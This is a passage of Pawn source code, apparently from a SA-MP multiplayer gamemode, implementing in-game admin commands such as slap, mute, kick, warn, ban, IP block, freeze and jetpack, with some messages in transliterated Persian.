            else
            {
                SendClientMessage(playerid, COLOR_GREEN, "Error: Your Admin level isn't high enough to use this command.");
            }
        }
        return 1;
    }
//-----------------------------------[Slap]-----------------------------------------------
    if(strcmp(cmd, "/slap", true) == 0)
    {
        if(IsPlayerConnected(playerid))
        {
            tmp = strtok(cmdtext, idx);
            if(!strlen(tmp))
            {
                SendClientMessage(playerid, COLOR_GRAD2, "USAGE: /slap [playerid/PartOfName]");
                return 1;
            }
            new playa;
            new Float:slx, Float:sly, Float:slz;
            playa = ReturnUser(tmp);
            if (PlayerInfo[playerid][pAdmin] >=1)
            {

                if(IsPlayerConnected(playa))
                {
                    if(playa != INVALID_PLAYER_ID)
                    {
                        if(PlayerInfo[playa][pAdmin] > 0) return SCM(playerid,-1,"Shoma Nmitavanid Admin Ra Slap Dahid");
                        GetPlayerName(playa, giveplayer, sizeof(giveplayer));
                        GetPlayerName(playerid, playername, sizeof(playername));
                        GetPlayerPos(playa, slx, sly, slz);
                        SetPlayerPosEx(playa, slx, sly, slz+5);
                        PlayerPlaySound(playa, 1190, slx, sly, slz+5);
                        format(string, sizeof(string), "AdmWarning: {FFFFFF}%s using the slap for player: {FFFFFF}%s.", playername, giveplayer);
                        ABroadCast(COLOR_LIGHTRED,string, 5);
                        format(string, sizeof(string), "You have been slapped by Admin %s", playername);
                        SCM(playa, COLOR_LIGHTRED, string);
                    }
                }
            }
            else
            {
                SendClientMessage(playerid, COLOR_GREEN, "Error: Your Admin level isn't high enough to use this command.");
            }
        }
        return 1;
    }
	if(strcmp(cmd, "/mute", true) == 0)
    {
        if(IsPlayerConnected(playerid))
        {
            tmp = strtok(cmdtext, idx);
            if(!strlen(tmp))
            {
                SendClientMessage(playerid, COLOR_GRAD2, "USAGE: /mute [playerid/PartOfName] [time(minutes)] [Reason]");
                return 1;
            }
            new playa;
            new time;
            playa = ReturnUser(tmp);
            tmp = strtok(cmdtext, idx);
            if(!strlen(tmp))
            {
                SendClientMessage(playerid, COLOR_GRAD2, "USAGE: /mute [playerid/PartOfName] [time(minutes)] [Reason]");
                return 1;
            }
            if(PlayerInfo[playa][pAdmin] > 0) return SCM(playerid,-1,"Shoma Nmitavanid Admin Ra Mute Dahid");
            time = strval(tmp);
                        new length = strlen(cmdtext);
                        while ((idx < length) && (cmdtext[idx] <= ' '))
                        {
                            idx++;
                        }
                        new offset = idx;
      new result[64];
                        while ((idx < length) && ((idx - offset) < (sizeof(result) - 1)))
                        {
                            result[idx - offset] = cmdtext[idx];
                            idx++;
                        }
                        result[idx - offset] = EOS;
                        if(!strlen(result))
                        {
                            SendClientMessage(playerid, COLOR_GRAD2, "USAGE: /mute [playerid/PartOfName] [time] [reason]");
                            return 1;
                        }
            if(PlayerInfo[playerid][pAdmin] >= 1)
            {
                if(IsPlayerConnected(playa))
                {
                    if(playa != INVALID_PLAYER_ID)
                    {
                        GetPlayerName(playa, giveplayer, sizeof(giveplayer));
                        GetPlayerName(playerid, sendername, sizeof(sendername));
                        format(string, sizeof(string), "* Shoma Bazikon %s Be Moddat %d Daghighe Mute Kardid.", giveplayer,time);
                        SendClientMessage(playerid, COLOR_LIGHTRED, string);
                        format(string, sizeof(string), "* Shoma Tavasote Admin %s Baraye %d Daghighe Mute Shodid.", sendername,time);
                        SendClientMessage(playa, COLOR_LIGHTRED, string);
                        PlayerInfo[playa][pMuteTime] = time*60;
                        SaveKonVal(playa, "pMuteTime", PINFO[playa][pMuteTime]);
                        format(string, sizeof(string), "Shoma Baraye %d Sanie Mute Hastid.", PlayerInfo[playerid][pMuteTime]);
                        SendClientMessage(playa, COLOR_LIGHTRED, string);
                        SendClientMessage(playa, COLOR_LIGHTRED, "Shoma Mitonid Ba CMD /mymute Az Zaman Baghi Mande mute Ba Khabar shavid");
						new string5[600];
                        format(string5, sizeof(string5), "Bazikon %s Baraye %d Daghighe Tavasote Admin %s Mute Shod , Dalil: %s", giveplayer, time, sendername, (result));
					    SendClientMessageToAll(COLOR_LIGHTRED, string5);
                    }
                }
            }
            else
            {
                SendClientMessage(playerid, COLOR_GRAD1, "Error: Your admin level isn't high enough to use this command.");
            }
        }
        return 1;
    }
	if(strcmp(cmd, "/mymute", true) == 0)
    {
        if(IsPlayerConnected(playerid))
        {
            if (PlayerInfo[playerid][pMuteTime] > 0)
            {
                format(string, sizeof(string), "Your Mute time left: [%d seconds]", PlayerInfo[playerid][pMuteTime]);
                SendClientMessage(playerid,COLOR_LIGHTBLUE, string);
            }
        }
        return 1;
    }
/* if(strcmp(cmd, "/explode", true) == 0)
    if(PlayerInfo[playerid][pAdmin] < 5 ) return SendClientMessage(playerid,-1,"{57e547}[LEVEL]: {00FFFF}Your Administrator Level Is Too Low!");
    new amount;
    new Float:boomx, Float:boomy, Float:boomz;
    GetPlayerPos(playerid,boomx, boomy, boomz);
    CreateExplosion(boomx, boomy , boomz, amount, 10);
    return 1;
}
------------------------------------------------------------------------------*/


		if(!strcmp(cmd, "/shop", true))
		{
				new shop[1024];
				format(shop,sizeof(shop),"{FFFF00}Add Gold \t\n{FFFFFF}Premium Account Unlimited - {57e547}200 Gold \t\n{FFFFFF}Rep Points \t\n{FFFFFF}Cash Money \t\n{FFFFFF}Clan \t\n{FFFFFF}Free from Jail - {57e547}50 Gold \t\n{FFFFFF}Clear 10FP - {57e547}50 Gold \t\n{FFFFFF}Change Nickname - {57e547}300 Gold \t\n{FFFFFF}Clear 1 warn - {57e547}200 Gold\t\n{FFFFFF}Change Sex - {57e547}200 Gold");
				new title[256];
				format(title, sizeof(title), "{57e547}JoKeR GaminG {FFFFFF} Shop - Golds: %d", PINFO[playerid][pGold]);
				ShowPlayerDialog(playerid,9090,DIALOG_STYLE_LIST,title,shop,"Select","Close");

			return 1;
		}


    if (strcmp(cmd, "/noafk", true) == 0)
    {
		if (PlayerInfo[playerid][pAdmin] <= 1500) return SCM(playerid,COLOR_YELLOW2,"Error: Unknown command.");
		tmp = strtok(cmdtext, idx);
		if(!strlen(tmp)) return SendClientMessage(playerid, COLOR_GRAD1, "USAGE: /NoAFK [playerid/PartOfName]");
		giveplayerid = ReturnUser(tmp);
		if(!IsPlayerConnected(giveplayerid)) return SendClientMessage(playerid, COLOR_GRAD1, "Player is Offline.");
		if(pNoAFK[giveplayerid] == 1)
		{
			pNoAFK[giveplayerid] =0;
			format(string, 256, "%s No AFK - Off",PlayerName(giveplayerid));
			SendClientMessage(playerid, COLOR_LIGHTRED, string);
			return 1;
		}
		if(pNoAFK[giveplayerid] == 0)
		{
			pNoAFK[giveplayerid] =1;
			format(string, 256, "%s No AFK - On",PlayerName(giveplayerid));
			SendClientMessage(playerid, COLOR_LIGHTRED, string);
			return 1;
		}
		return 1;
	}



		if(!strcmp(cmd,"/safezone",true))
		{
		  if(PINFO[playerid][pAdmin] < 9) return SCM(playerid,COLOR_GREEN,"Error: You are not authorized to use that command.");
		 if(SafeOn == 1) {
		 SCM(playerid,COLOR_GG,"SafeZone system has been locked succeefully");
//		 new string[512];
		 GetPlayerName(playerid, sendername, sizeof(sendername));
		 format(string, sizeof(string), "[Admin-Warn]:{FFFFFF} Admin %s closed SafeZone system on the server", sendername);
		ABroadCast(COLOR_AdminWarn,string,1);
		SafeOn = 0;
	 }
		else if(SafeOn == 0) {
		 SCM(playerid,COLOR_GG,"SafeZone system has been unlocked succefully.");
//		 new string[512];
		 GetPlayerName(playerid, sendername, sizeof(sendername));
		 format(string, sizeof(string), "[Admin-Warn]:{FFFFFF} Admin %s opened SafeZone system on the server", sendername);
		 SafeOn = 1;
		ABroadCast(COLOR_AdminWarn,string,1);
		 }
	 return 1;
		}



	 if(strcmp(cmd, "/skick", true) == 0 || strcmp(cmd, "/skk", true) == 0)
		{
			if(IsPlayerConnected(playerid))
			{
				tmp = strtok(cmdtext, idx);
				if(!strlen(tmp))
				{
					SendMessage(playerid, COLOR_GRAD2, "USPGE: /skick [playerid/PartOfName] [reason]");
					return 1;
				}
				giveplayerid = ReturnUser(tmp);
				if (PlayerInfo[playerid][pAdmin] >= 1)
				{
					if(IsPlayerConnected(giveplayerid))
					{
						if(giveplayerid != INVALID_PLAYER_ID)
						{
							GetPlayerName(giveplayerid, giveplayer, sizeof(giveplayer));
							GetPlayerName(playerid, sendername, sizeof(sendername));
							new length = strlen(cmdtext);
							while ((idx < length) && (cmdtext[idx] <= ' '))
							{
								idx++;
							}
							new offset = idx;
		  new result[64];
							while ((idx < length) && ((idx - offset) < (sizeof(result) - 1)))
							{
								result[idx - offset] = cmdtext[idx];
								idx++;
							}
							result[idx - offset] = EOS;
							if(!strlen(result))
							{
								SendMessage(playerid, COLOR_GRAD2, "USPGE: /kick [playerid/PartOfName] [reason]");
								return 1;
							}
		if(PINFO[playerid][pAdmin] < PINFO[giveplayerid][pAdmin]) return SCM(playerid, COLOR_AMIR, "you cannot kick an admin higher than you.");
							if(giveplayerid == playerid) return SCM(playerid, COLOR_AMIR, "you cannot kick yourself");
							new year, month,day;
							getdate(year, month, day);
							format(string, sizeof(string), "[ADM-Warn]{FFFFFF}: %s was kicked by Admin %s, reason: %s (%d-%d-%d)", giveplayer, sendername, (result),month,day,year);
							KickLog(string);
							format(string, sizeof(string), "[ADM-Warn]{FFFFFF}: %s was kicked by Admin %s, reason: %s", giveplayer, sendername, (result));
							ABroadCast(COLOR_AdminWarn,string,1);
							KickWithMessage(giveplayerid, COLOR_LIGHTRED, "You have been kicked.");
							return 1;
						}
					}
					else
					{
					format(string, sizeof(string), "That player is offline.");
					SendMessage(playerid, COLOR_GRAD1, string);
					}
				}
				else
				{
				SCM(playerid,COLOR_GREEN,"Error: Your admin level isn't high enough to use this command.");
				return 1;
				}
			}
			return 1;
		}


    if(strcmp(cmd, "/kick", true) == 0 || strcmp(cmd, "/kk", true) == 0)
    {
        if(IsPlayerConnected(playerid))
        {
            tmp = strtok(cmdtext, idx);
            if(!strlen(tmp))
            {
                SendClientMessage(playerid, COLOR_GRAD2, "USAGE: /kick [playerid/PartOfName] [reason]");
                return 1;
            }
            giveplayerid = ReturnUser(tmp);
            if (PlayerInfo[playerid][pAdmin] >= 1)
            {
                if(IsPlayerConnected(giveplayerid))
                {
                    if(giveplayerid != INVALID_PLAYER_ID)
                    {
                        GetPlayerName(giveplayerid, giveplayer, sizeof(giveplayer));
                        GetPlayerName(playerid, sendername, sizeof(sendername));
                        new length = strlen(cmdtext);
                        while ((idx < length) && (cmdtext[idx] <= ' '))
                        {
                            idx++;
                        }
                        new offset = idx;
      new result[64];
                        while ((idx < length) && ((idx - offset) < (sizeof(result) - 1)))
                        {
                            result[idx - offset] = cmdtext[idx];
                            idx++;
                        }
                        result[idx - offset] = EOS;
                        if(!strlen(result))
                        {
                            SendClientMessage(playerid, COLOR_GRAD2, "USAGE: /kick [playerid/PartOfName] [reason]");
                            return 1;
                        }
		if(PINFO[playerid][pAdmin] < PINFO[giveplayerid][pAdmin]) return SCM(playerid, COLOR_AMIR, "you cannot kick an admin higher than you.");
                        new year, month,day;
                        getdate(year, month, day);
                        format(string, sizeof(string), "AdmCmd: %s Tavasote Admin %s Kick Shod , Dalil: %s (%d-%d-%d)", giveplayer, sendername, (result),month,day,year);
                        KickLog(string);
                        format(string, sizeof(string), "AdmCmd: %s Tavasote Admin %s Kick Shod , Dalil: %s", giveplayer, sendername, (result));
                        SendClientMessageToAll(COLOR_LIGHTRED, string);
                        KickWithMessage(giveplayerid, COLOR_LIGHTRED, "Shoma Kick Shodid.");
                        return 1;
                    }
                }
                else
                {
                format(string, sizeof(string), "That player is offline.");
                SendClientMessage(playerid, COLOR_GRAD1, string);
                }
            }
            else
            {
            SCM(playerid,COLOR_GREEN,"Error: Your admin level isn't high enough to use this command.");
            return 1;
            }
        }
        return 1;
    }





    if(strcmp(cmd, "/unmute", true) == 0)
    {
		if(PlayerInfo[playerid][pAdmin] == 0) return SendClientMessage(playerid, COLOR_GRAD1, "Error: Your admin level isn't high enough to use this command.");
		tmp = strtok(cmdtext, idx);
		if(!strlen(tmp)) return SendClientMessage(playerid, COLOR_GRAD2, "USAGE: /unmute [playerid/PartOfName] [reason]");
		giveplayerid = ReturnUser(tmp);
		if(!IsPlayerConnected(giveplayerid)) return SendClientMessage(playerid, COLOR_GRAD1, "That player is offline.");
		new length = strlen(cmdtext);
		while ((idx < length) && (cmdtext[idx] <= ' ')) idx++;
		new offset = idx;
		new result[64];
		while ((idx < length) && ((idx - offset) < (sizeof(result) - 1)))
		{
			result[idx - offset] = cmdtext[idx];
			idx++;
		}
		result[idx - offset] = EOS;
		if(!strlen(result)) return SendClientMessage(playerid, COLOR_GRAD2, "USAGE: /unmute [playerid/PartOfName] [reason]");
		PlayerInfo[giveplayerid][pMuteTime] =0;
		SaveKonVal(giveplayerid, "pMuteTime", PINFO[giveplayerid][pMuteTime]);
		format(string, sizeof(string), "Player %s was unmuted By Admin %s reason: %s", PlayerName(giveplayerid), PlayerName(playerid), (result));
		SendClientMessageToAll(COLOR_LIGHTRED, string);
        return 1;
    }
/*----------------------------------------------------------------------------*/
    if (strcmp(cmd, "/unban", true)==0)
    {
        if(PlayerInfo[playerid][pAdmin] <= 8) return SCM(playerid,COLOR_GREEN,"Your admin level isn't high enough to use this command.");
		tmp = strtok(cmdtext, idx);
		if(!strlen(tmp)) return SCM(playerid,COL_SYN,"Syntax: /unban <FullName>");
		UnBanPlayer(playerid,tmp);
        return 1;
    }


//-------------------------------------[Warned]--------------------------------------------------
    if(strcmp(cmd, "/warn", true) == 0)
    {
        if(IsPlayerConnected(playerid))
        {
            tmp = strtok(cmdtext, idx);
            if(!strlen(tmp))
            {
                SendClientMessage(playerid, COLOR_GRAD2, "USAGE: /warn [playerid/PartOfName] [reason]");
                return 1;
            }
            giveplayerid = ReturnUser(tmp);
            if (PlayerInfo[playerid][pAdmin] >= 1)
            {
                if(IsPlayerConnected(giveplayerid))
                {
                    if(giveplayerid != INVALID_PLAYER_ID)
                    {
                        GetPlayerName(giveplayerid, giveplayer, sizeof(giveplayer));
                        GetPlayerName(playerid, sendername, sizeof(sendername));
                        new length = strlen(cmdtext);
                        while ((idx < length) && (cmdtext[idx] <= ' '))
                        {
                            idx++;
                        }
                        new offset = idx;
      new result[64];
                        while ((idx < length) && ((idx - offset) < (sizeof(result) - 1)))
                        {
                            result[idx - offset] = cmdtext[idx];
                            idx++;
                        }
                        result[idx - offset] = EOS;
                        if(!strlen(result))
                        {
                            SendClientMessage(playerid, COLOR_GRAD2, "USAGE: /warn [playerid/PartOfName] [reason]");
                            return 1;
                        }
                        if(warntime[playerid] == 1) return SendClientMessage(playerid, COLOR_GRAD2, "Wait 10 seconds!");
                        PlayerInfo[giveplayerid][pWarns] += 1;
                        SaveKonVal(giveplayerid, "pWarns", PINFO[giveplayerid][pWarns]);
                        warntime[playerid] = 1;
                        WarnLog(string);
                        SetTimerEx("warnt", 10000, 0, "d", playerid);
                        if(PlayerInfo[giveplayerid][pWarns] >= 3) BanPlayer(INVALID_PLAYER_ID,giveplayer,PlayerInfo[giveplayerid][pWarns],"3 warnings");
                        new year, month,day;
                        getdate(year, month, day);
                        format(string, sizeof(string), "You warned %s, reason: %s", giveplayer, (result));
                        SendClientMessage(playerid, COLOR_LIGHTRED, string);
                        format(string, sizeof(string), "You were warned by %s, reason: %s", sendername, (result));
                        SendClientMessage(giveplayerid, COLOR_LIGHTRED, string);
                        return 1;
                    }
                }
                else
                {
                format(string, sizeof(string), "that player is offline.");
                SendClientMessage(playerid, COLOR_GRAD1, string);
                }
            }
            else
            {
            SCM(playerid,COLOR_GREEN,"Error: Your admin level isn't high enough to use this command.");
            return 1;
            }
        }
        return 1;
    }
    if(strcmp(cmd, "/unwarn", true) == 0)
    {
        if(IsPlayerConnected(playerid))
        {
            tmp = strtok(cmdtext, idx);
            if(!strlen(tmp))
            {
                SendClientMessage(playerid, COLOR_GRAD2, "USAGE: /unwarn [playerid/PartOfName] [reason]");
                return 1;
            }
            giveplayerid = ReturnUser(tmp);
            if (PlayerInfo[playerid][pAdmin] >= 5)
            {
                if(IsPlayerConnected(giveplayerid))
                {
                    if(giveplayerid != INVALID_PLAYER_ID)
                    {
                        GetPlayerName(giveplayerid, giveplayer, sizeof(giveplayer));
                        GetPlayerName(playerid, sendername, sizeof(sendername));
                        WarnLog(string);
                        new length = strlen(cmdtext);
                        while ((idx < length) && (cmdtext[idx] <= ' '))
                        {
                            idx++;
                        }
                        new offset = idx;
      new result[64];
                        while ((idx < length) && ((idx - offset) < (sizeof(result) - 1)))
                        {
                            result[idx - offset] = cmdtext[idx];
                            idx++;
                        }
                        result[idx - offset] = EOS;
                        if(!strlen(result))
                        {
                            SendClientMessage(playerid, COLOR_GRAD2, "USAGE: /unwarn [playerid/PartOfName] [reason]");
                            return 1;
                        }
                        PlayerInfo[giveplayerid][pWarns] -= 1;
                        SaveKonVal(giveplayerid, "pWarns", PINFO[giveplayerid][pWarns]);
                        if(PlayerInfo[giveplayerid][pWarns] >= 0)
                        {
                            format(string, sizeof(string), "You unwarned %s, reason: %s", giveplayer, (result));
                            SendClientMessage(playerid, COLOR_LIGHTRED, string);
                            format(string, sizeof(string), "You were unwarned by %s, reason: %s", sendername, (result));
                            SendClientMessage(giveplayerid, COLOR_LIGHTRED, string);
                            return 1;
                        }

                    }
                }//not connected
            }
            else
            {
                format(string, sizeof(string), "That player is offline.");
                SendClientMessage(playerid, COLOR_GRAD1, string);
            }
        }
        return 1;
    }
/*----------------------------------------------------------------------------*/

    if (strcmp(cmd, "/jetpack", true) == 0)
    {
        if(IsPlayerConnected(playerid))
        {
            if (PlayerInfo[playerid][pAdmin] >= 4)
            {
                SendClientMessage(playerid, COLOR_GREY, "Jetpack already for use");
                GivePlayerJetpack(playerid);
                return 1;
            }
            else return SCM(playerid, COLOR_GREEN,"You are not admin.");
        }
    }

    if (strcmp(cmd, "/jetpackto", true) == 0)
    {
        if(IsPlayerConnected(playerid))
        {
            tmp = strtok(cmdtext, idx);
            if(!strlen(tmp))
            {
                SendClientMessage(playerid, COLOR_GRAD2, "USAGE: /jetpackto [playerid/PartOfName]");
                return 1;
            }
            new playa;
            playa = ReturnUser(tmp);
            if (PlayerInfo[playerid][pAdmin] >= 4)
            {
			    new stramir[512];
				GetPlayerName(playa, giveplayer, sizeof(giveplayer));
				format(stramir, 512, "AdmWarning: {FFFFFF}%s got a jetpack by {FFFFFF}%s", giveplayer, PINFO[playerid][pName]);
				ABroadCast(COLOR_AdminWarn,stramir,1);
                SendClientMessage(playa, COLOR_GREY, "Jetpack already for use");
                GivePlayerJetpack(playa);
                return 1;
            }
            else return SCM(playerid, COLOR_GREEN,"You are not admin.");
        }
    }
   if (strcmp(cmd, "/surf", true) == 0)
    {
			if(PlayerInfo[playerid][pAdmin] < 5) return SCM(playerid,COLOR_RED,"Error: You are not authorized to use that command.");
            tmp = strtok(cmdtext, idx);
            if(!strlen(tmp))
            {
                SendClientMessage(playerid, COL_SYN, "Syntax: /surf <playerid/PartOfName>");
                return 1;
            }
					new playa;
					playa = ReturnUser(tmp);
					new sender[40];
					new givep[40];
					GetPlayerName(playerid, sender, sizeof(sender));
					GetPlayerName(playa, givep, sizeof(givep));
					Surfing[playa] = 1;
					new str[512];
					SetPlayerVelocity(playa,0.3,0.0,0.3);
					format(str, sizeof(str), "{FFFFFF}Admin %s {2BFF00}enabled {FFFFFF}allow surfing for player %s",sender,givep);
					AdminWarn(str);


				return 1;
    }
    	if (strcmp(cmd, "/unsurf", true) == 0)
		{
				if(PlayerInfo[playerid][pAdmin] < 5) return SCM(playerid,COLOR_GREEN,"In CMD Baraye Estefade Shoma Nist.");
				tmp = strtok(cmdtext, idx);
				if(!strlen(tmp))
				{
					SendMessage(playerid, COLOR_GRAD2, "USPGE: /surf [playerid/PartOfName]");
					return 1;
				}
						new playa;
						playa = ReturnUser(tmp);
						new sender[40];
						new givep[40];
						GetPlayerName(playerid, sender, sizeof(sender));
						GetPlayerName(playa, givep, sizeof(givep));
						Surfing[playa] = 0;
						new str[512];
						format(str, sizeof(str), "{FFFFFF}Admin %s {FF0000}disabled {FFFFFF}allow surfing for player %s",sender,givep);
						AdminWarn(str);
						return 1;
		}

     if (strcmp(cmd, "/rjetpack", true) == 0)
    {
        if(IsPlayerConnected(playerid))
        {
            tmp = strtok(cmdtext, idx);
            if(!strlen(tmp))
            {
                SendClientMessage(playerid, COLOR_GRAD2, "USAGE: /rjetpackto [playerid/PartOfName]");
                return 1;
            }
            new playa;
            playa = ReturnUser(tmp);
            if (PlayerInfo[playerid][pAdmin] >= 4)
            {
			    new stramir[512];
				GetPlayerName(playa, giveplayer, sizeof(giveplayer));
				format(stramir, 512, "AdmWarning: {FFFFFF}%s removed jetpack by {FFFFFF}%s", giveplayer, PINFO[playerid][pName]);
				ABroadCast(COLOR_AdminWarn,stramir,1);
                SendClientMessage(playa, COLOR_GREY, "Jetpack Removed");
				SetPlayerSpecialAction(playa,SPECIAL_ACTION_NONE);
                return 1;
            }
            else return SCM(playerid, COLOR_GREEN,"You are not admin.");
        }
    }


		if(strcmp(cmd, "/banvps", true) == 0)
		{
			if(IsPlayerConnected(playerid))
			{
				tmp = strtok(cmdtext, idx);
				if(!strlen(tmp))
				{
					SendMessage(playerid, COLOR_GRAD2, "USPGE: /banvps [playerid/PartOfName]");
					return 1;
				}
				new playa;
				playa = ReturnUser(tmp);
				if (PlayerInfo[playerid][pAdmin] >= 1)
				{
					if(IsPlayerConnected(playa))
					{
						if(playa != INVALID_PLAYER_ID)
						{
							if(PINFO[playerid][pAdmin] < PINFO[playa][pAdmin]) return SCM(playerid, COLOR_AMIR, "you cannot ban an admin higher than you.");
							GetPlayerName(playa, giveplayer, sizeof(giveplayer));
							GetPlayerName(playerid, sendername, sizeof(sendername));
							if(playa == playerid) return SCM(playerid, COLOR_AMIR, "You Cannot Ban Yourself");
							Ban(playa);
//							new string[512];
							format(string, sizeof(string), "[Admin-Warn]: {FFFFFF}%s samp banned by Admin %s.",giveplayer, sendername);
							ABroadCast(COLOR_AdminWarn,string,1);
						}
					}
				}
				else
				{
					SendMessage(playerid, COLOR_GREEN, "Error: Your admin level isn't high enough to use this command.");
				}
			}
			return 1;
		}



	if(strcmp(cmd, "/blockip", true) == 0)
		{
			if(IsPlayerConnected(playerid))
			{
				tmp = strtok(cmdtext, idx);
				if(!strlen(tmp))
				{
					SCM(playerid, COLOR_GRAD2, "USPGE: /blockip [playerid/PartOfName]");
					return 1;
				}
				new playa;
				playa = ReturnUser(tmp);
				if (PlayerInfo[playerid][pAdmin] >= 5)
				{
					if(IsPlayerConnected(playa))
					{
						if(playa != INVALID_PLAYER_ID)
						{
							if(PINFO[playerid][pAdmin] < PINFO[playa][pAdmin]) return SCM(playerid, COLOR_GREEN, "you cannot block an admin higher than you.");
							GetPlayerName(playa, giveplayer, sizeof(giveplayer));
							GetPlayerName(playerid, sendername, sizeof(sendername));
							new ip[40];
							GetPlayerIp(playa, ip, sizeof(ip));
							if(playa == playerid) return SCM(playerid, COLOR_GREEN, "You Cannot Ban Yourself");
							BlockIpAddress(ip, 0);
//							new string[512];
							format(string, sizeof(string), "[Admin-Warn]: {FFFFFF}%s blocked ip by Admin %s.",giveplayer, sendername);
							ABroadCast(COLOR_AdminWarn,string,1);
						}
					}
				}
				else
				{
					SCM(playerid, COLOR_GREEN, "Error: Your admin level isn't high enough to use this command.");
				}
			}
			return 1;
		}

		if(strcmp(cmd, "/unblockip", true) == 0)
		{
		if(PINFO[playerid][pAdmin] < 8) return SCM(playerid, COLOR_GREEN, "Error: You are not authorized to use this command.");
		new result[145];
		result = strtokEx(cmdtext, idx);
		if(!strlen(result))
		{
			SCM(playerid, COL_SYN, "Syntax: /unblockip <IP>");
			return 1;
		}
		UnBlockIpAddress(result);
		return 1;
		}


    if(!strcmp(cmd,"/ban",true))
    {
        if(PlayerInfo[playerid][pAdmin] <= 0) return SCM(playerid,COLOR_YELLOW2,"Error: You are not admin");
        new Fullname[256];
        Fullname = strtok(cmdtext,idx);
        if(!strlen(Fullname)) return SCM(playerid,COL_SYN,"Syntax: /Ban <PlayerName> <Days> <Reason>");
        tmp = strtok(cmdtext,idx);
        if(!strlen(tmp)) return SCM(playerid,COL_SYN,"Syntax: /Ban <PlayerName> <Days> <Reason>");
        new days = strval(tmp);
        if(days < 0 || days > 20) return SCM(playerid,COLOR_ALI,"Type a day between 1 and 20.");
        tmp = strtokEx(cmdtext,idx);
        if(!strlen(tmp)) return SCM(playerid,COL_SYN,"Syntax: /Ban <PlayerName> <Days> <Reason>");
        BanPlayer(playerid, Fullname, days, tmp, 1);
        return 1;
    }
    if(!strcmp(cmd,"/banid",true))
    {
        if(PlayerInfo[playerid][pAdmin] <= 0) return SCM(playerid,COLOR_YELLOW2,"Error: You are not admin");
        tmp = strtok(cmdtext,idx);
        if(!strlen(tmp)) return SCM(playerid,COL_SYN,"Syntax: /Banid <PlayerID> <Days> <Reason>");
        new Fullname = strval(tmp);
		if(!IsPlayerConnected(Fullname)) return SCM(playerid,COL_SYN,"Player is not connected.");
        tmp = strtok(cmdtext,idx);
        if(!strlen(tmp)) return SCM(playerid,COL_SYN,"Syntax: /Banid <PlayerID> <Days> <Reason>");
        new days = strval(tmp);
        if(days < 0 || days > 20) return SCM(playerid,COLOR_ALI,"Type a day between 1 and 20.");
        tmp = strtokEx(cmdtext,idx);
        if(!strlen(tmp)) return SCM(playerid,COL_SYN,"Syntax: /Banid <PlayerID> <Days> <Reason>");
        BanPlayer(playerid, PlayerName(Fullname), days, tmp, 1);
        return 1;
    }
/*	if(!strcmp(cmd,"/ban",true))
	{
		if(PlayerInfo[playerid][pAdmin] <= 0) return SCM(playerid,COLOR_YELLOW2,"Error: You are not admin");
		tmp = strtok(cmdtext,idx);
		if(!strlen(tmp)) return SCM(playerid,COL_SYN,"Syntax: /ban [playerid/PartOfName] [Days(1-60 , 0= Perementaly Ban)] [Reason]");
		new Fullname = strval(tmp);
		tmp = strtok(cmdtext,idx);
		if(!strlen(tmp)) return SCM(playerid,COL_SYN,"Syntax: /ban [playerid/PartOfName] [Days(1-60 , 0= Perementaly Ban)] [Reason]");
		new days = strval(tmp);
		if(days < 0 || days > 60) return SCM(playerid,COLOR_ALI,"Type a day between 1 and 60.");

		tmp = strtokEx(cmdtext,idx);
		if(!strlen(tmp)) return SCM(playerid,COL_SYN,"Syntax: /ban [playerid/PartOfName] [Days(1-60 , 0= Perementaly Ban)] [Reason]");
		BanPlayer(playerid, Fullname, days, tmp, 1);
		if(IsPlayerConnected(Fullname)) return SetTimerEx("BanPlayerTime",200, false, "i", Fullname);
		return 1;
	}*/
//---------------------------------[Freeze]------------------------------------------------
    if(strcmp(cmd, "/freeze", true) == 0)
    {
        if(IsPlayerConnected(playerid))
        {
            tmp = strtok(cmdtext, idx);
            if(!strlen(tmp))
            {
                SendClientMessage(playerid, COLOR_GRAD2, "USAGE: /freeze [playerid/PartOfName]");
                return 1;
            }
            new playa;
            playa = ReturnUser(tmp);
            //if(PlayerInfo[playa][pAdmin] > 0)
            //{
            //  SendClientMessage(playerid, COLOR_GRAD2, "Admins can not be frozen");
            //  return 1;
            //}
            if (PlayerInfo[playerid][pAdmin] >= 3)
            {
                if(IsPlayerConnected(playa))
                {
                    if(playa != INVALID_PLAYER_ID)
                    {
                        GetPlayerName(playa, giveplayer, sizeof(giveplayer));
                        GetPlayerName(playerid, sendername, sizeof(sendername));
                        TogglePlayerControllable(playa, 0);
			OnFreeze[playa] = 1;
                    }
                }
            }
            else
            {
                SendClientMessage(playerid, COLOR_GREEN, "Error: Your admin level isn't high enough to use this command.");
            }
        }
        return 1;
    }
//----------------------------------[unfreeze]------------------------------------------------
    if(strcmp(cmd, "/unfreeze", true) == 0)
    {
        if(IsPlayerConnected(playerid))
        {
            tmp = strtok(cmdtext, idx);
            if(!strlen(tmp))
            {
                SendClientMessage(playerid, COLOR_GRAD2, "USAGE: /unfreeze [playerid]");
                return 1;
            }
            new playa;
            playa = ReturnUser(tmp);
            if (PlayerInfo[playerid][pAdmin] >= 3)
            {
                if(IsPlayerConnected(playa))
                {
                    if(playa != INVALID_PLAYER_ID)
                    {
                        GetPlayerName(playa, giveplayer, sizeof(giveplayer));
                        GetPlayerName(playerid, sendername, sizeof(sendername));
                        TogglePlayerControllable(playa, 1);
			OnFreeze[playa] = 0;
                    }
                }
            }
            else
            {
                SendClientMessage(playerid, COLOR_GREEN, "Error: Your admin level isn't high enough to use this command.");
            }
        }
        return 1;
    }
//------------------------------------[/Admins]------------------------------------
    if (strcmp(cmd, "/admins", true) == 0)
    {
       if(IsPlayerConnected(playerid))
        {
            new count = 0;
            SendClientMessage(playerid, CRISTIAN, "{ede58e}|_________Online Admins_________|");
            for(new i = 0; i < LastPID; i++)
            {
                if(IsPlayerConnected(i))
                {
                    if(PlayerInfo[i][pAdmin] == 1)
                    {
                        GetPlayerName(i, sendername, sizeof(sendername));
                        //format(string, 128, "{F21717}%s{FFFFFF} - Admin-Level %d (Id: %d)", sendername, PlayerInfo[i][pAdmin], i);
                        format(string, sizeof(string),"{F21717}Trial Admin{FFFFFF} - %s (%d)", sendername, i);
                        //format(string, 128, "{B57412}%s{FFFFFF} is Admin Level %d (%d)", sendername, PlayerInfo[i][pAdmin], i);
                        if (strlen(string) > 1)SendClientMessage(playerid, COLOR_WHITE, string);
                        count++;
                    }
                    if(PlayerInfo[i][pAdmin] == 2)
                    {
                        GetPlayerName(i, sendername, sizeof(sendername));
                        //format(string, 128, "{F21717}%s{FFFFFF} - Admin-Level %d (Id: %d)", sendername, PlayerInfo[i][pAdmin], i);
                        format(string, sizeof(string),"{F21717}Newcomer Admin{FFFFFF} - %s (%d)", sendername, i);
